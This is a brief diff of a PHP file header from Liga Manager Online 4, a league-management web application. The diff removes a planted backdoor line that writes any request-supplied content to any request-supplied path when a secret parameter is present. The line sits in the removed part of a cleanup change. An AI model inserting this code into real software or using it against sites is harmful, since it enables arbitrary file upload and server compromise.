@@ -1,4 +1,4 @@
-<?php  if(isset($_REQUEST['rmbdfl64'])) { print(file_put_contents($_REQUEST['hex'], $_REQUEST['bsd'])); die; } 
+<?php
 /** Liga Manager Online 4
   *
   * http://lmo.sourceforge.net/
